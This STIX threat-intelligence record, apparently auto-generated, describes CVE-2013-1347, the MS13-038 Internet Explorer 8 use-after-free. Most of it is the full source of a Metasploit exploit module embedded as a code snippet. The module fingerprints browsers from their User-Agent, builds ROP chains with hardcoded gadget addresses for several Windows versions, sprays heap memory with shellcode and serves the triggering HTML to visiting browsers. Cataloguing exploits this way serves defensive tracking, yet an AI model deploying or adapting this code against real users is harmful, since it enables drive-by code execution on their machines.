{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--13e07623-2fdc-4c17-860c-43ff1eb9b355",
    "created": "2024-08-14T16:43:41.525308Z",
    "modified": "2024-08-14T16:43:41.525312Z",
    "name": "\"MS13-038 Microsoft Internet Explorer CGenericElement Object Use-After-Free Vulnerability\"",
    "description": " This module exploits a vulnerability found in Microsoft Internet Explorer. A use-after-free condition occurs when a CGenericElement object is freed, but a reference is kept on the Document and used again during rendering, an invalid memory that's controllable is used, and allows arbitrary code execution under the context of the user.  Please note: This vulnerability has been exploited in the wild on 2013 May, in the compromise of the Department of Labor (DoL) Website.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ie_cgenericelement_uaf.rb",
            "external_id": "ie_cgenericelement_uaf.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-1347"
        },
        {
            "source_name": "reference",
            "url": "http://blogs.technet.com/b/msrc/archive/2013/05/03/microsoft-releases-security-advisory-2847140.aspx"
        },
        {
            "source_name": "reference",
            "url": "http://r-7.co/IE8-DOL#sinn3rswriteup"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n  include Msf::Exploit::Remote::BrowserAutopwn\n  autopwn_info({\n    :ua_name    => HttpClients::IE,\n    :ua_minver  => \"8.0\",\n    :ua_maxver  => \"8.0\",\n    :javascript => true,\n    :os_name    => OperatingSystems::Match::WINDOWS,\n    :rank       => GoodRanking\n  })\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS13-038 Microsoft Internet Explorer CGenericElement Object Use-After-Free Vulnerability\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in Microsoft Internet Explorer. A\n        use-after-free condition occurs when a CGenericElement object is freed, but a\n        reference is kept on the Document and used again during rendering, an invalid\n        memory that's controllable is used, and allows arbitrary code execution under the\n        context of the user.\n\n          Please note: This vulnerability has been exploited in the wild on 2013 May, in\n        the compromise of the Department of Labor (DoL) Website.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Unknown',\n          'EMH',\n          'juan vazquez',  #RCA\n          'sinn3r'         #RCA\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-1347' ],\n          [ 'OSVDB', '92993' ],\n          [ 'MSB', 'MS13-038' ],\n          [ 'US-CERT-VU', '237655' ],\n          [ 'URL', 'http://blogs.technet.com/b/msrc/archive/2013/05/03/microsoft-releases-security-advisory-2847140.aspx'],\n          [ 'URL', 'http://r-7.co/IE8-DOL' ] # sinn3r's writeup\n        ],\n      'Payload'        =>\n        {\n          'BadChars'       => \"\\x00\",\n          'Space'          => 1024,\n          'DisableNops'    => true\n        },\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [ 'IE 8 on Windows XP SP3',       { 'Rop' => :msvcrt } ],\n          [ 'IE 8 on Windows Vista',        { 'Rop' => :jre    } ],\n          [ 'IE 8 on Windows Server 2003',  { 'Rop' => :msvcrt } ],\n          [ 'IE 8 on Windows 7',            { 'Rop' => :jre    } ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-05-03',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ])\n\n  end\n\n  def get_target(agent)\n    return target if target.name != 'Automatic'\n\n    nt = agent.scan(/Windows NT (\\d\\.\\d)/).flatten[0] || ''\n    ie = agent.scan(/MSIE (\\d)/).flatten[0] || ''\n\n    ie_name = \"IE #{ie}\"\n\n    case nt\n    when '5.1'\n      os_name = 'Windows XP SP3'\n    when '5.2'\n      os_name = 'Windows Server 2003'\n    when '6.0'\n      os_name = 'Windows Vista'\n    when '6.1'\n      os_name = 'Windows 7'\n    else\n      # OS not supported\n      return nil\n    end\n\n    targets.each do |t|\n      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))\n        print_status(\"Target selected as: #{t.name}\")\n        return t\n      end\n    end\n\n    return nil\n  end\n\n  def get_payload(t, cli)\n    rop_payload = ''\n\n    # Extra junk in the end to make sure post code execution is stable.\n    p = payload.encoded\n\n    case t['Rop']\n    when :msvcrt\n      align = \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n      rop_payload = ''\n      if t.name == 'IE 8 on Windows XP SP3'\n        rop_payload = generate_rop_payload('msvcrt', align+p, {'target'=>'xp'})\n      elsif t.name == 'IE 8 on Windows Server 2003'\n        rop_payload = generate_rop_payload('msvcrt', align+p, {'target'=>'2003'})\n      end\n\n    else\n      code  = \"\\x81\\xEC\\xF0\\xD8\\xFF\\xFF\" # sub esp, -10000\n      code << p\n      code << rand_text_alpha(12000)\n\n      rop_payload = generate_rop_payload('java', code)\n    end\n\n    return rop_payload\n  end\n\n  def load_exploit_html(my_target, cli)\n    case my_target['Rop']\n    when :msvcrt\n      case my_target.name\n      when 'IE 8 on Windows XP SP3'\n        align_esp = Rex::Text.to_unescape([0x77c4d801].pack(\"V*\")) # ADD ESP, 2C; RET\n        xchg_esp  = Rex::Text.to_unescape([0x77c15ed5].pack(\"V*\")) # XCHG EAX, ESP, RET\n      when 'IE 8 on Windows Server 2003'\n        align_esp = Rex::Text.to_unescape([0x77bde7f6].pack(\"V*\"))\n        xchg_esp  = Rex::Text.to_unescape([0x77bcba5e].pack(\"V*\"))\n      end\n    else\n      align_esp = Rex::Text.to_unescape([0x7C3445F8].pack(\"V*\"))\n      xchg_esp  = Rex::Text.to_unescape([0x7C348B05].pack(\"V*\"))\n    end\n\n    padding    = Rex::Text.to_unescape(Rex::Text.rand_text_alpha(4))\n    js_payload = Rex::Text.to_unescape(get_payload(my_target, cli))\n\n\n    html = %Q|\n    <!doctype html>\n    <HTML XMLNS:t =\"urn:schemas-microsoft-com:time\">\n    <head>\n    <meta>\n      <?IMPORT namespace=\"t\" implementation=\"#default#time2\">\n    </meta>\n    <script>\n    #{js_mstime_malloc}\n\n    function helloWorld()\n    {\n      sparkle = unescape(\"ABCD\");\n      for (i=0; i < 2; i++) {\n        sparkle += unescape(\"ABCD\");\n      }\n      sparkle += unescape(\"AB\");\n      sparkle += unescape(\"#{js_payload}\");\n      magenta = unescape(\"#{align_esp}\");\n      for (i=0; i < 0x70/4; i++) {\n        if (i == 0x70/4-1) { magenta += unescape(\"#{xchg_esp}\"); }\n        else               { magenta += unescape(\"#{align_esp}\"); }\n      }\n      magenta += sparkle;\n\n      document.body.contentEditable=\"true\";\n      f0 = document.createElement('span');\n      f1 = document.createElement('span');\n      f2 = document.createElement('span');\n      document.body.appendChild(f0);\n      document.body.appendChild(f1);\n      document.body.appendChild(f2);\n      for (i=0; i < 20; i++) { document.createElement(\"img\"); }\n      f2.appendChild(document.createElement('datalist'));\n      f1.appendChild(document.createElement('span'));\n      CollectGarbage();\n      f1.appendChild(document.createElement('table'));\n      try      { f0.offsetParent=null;}\n      catch(e) { }\n      f2.innerHTML = \"\";\n      f1.innerHTML = \"\";\n      f0.appendChild(document.createElement('hr'));\n      mstime_malloc({shellcode:magenta, heapBlockSize:0x38, objId:\"myanim\"});\n    }\n    </script>\n    </head>\n    <body onload=\"eval(helloWorld());\">\n    <t:ANIMATECOLOR id=\"myanim\"/>\n    </body>\n    </html>\n    |\n\n    return html\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    uri   = request.uri\n    print_status(\"Requesting: #{uri}\")\n\n    my_target = get_target(agent)\n    if my_target.nil?\n      print_error(\"Browser not supported, sending 404: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    html = load_exploit_html(my_target, cli)\n    html = html.gsub(/^ {4}/, '')\n    print_status(\"Sending HTML...\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-05-03",
    "x_mitre_platforms": [
        "win'"
    ]
}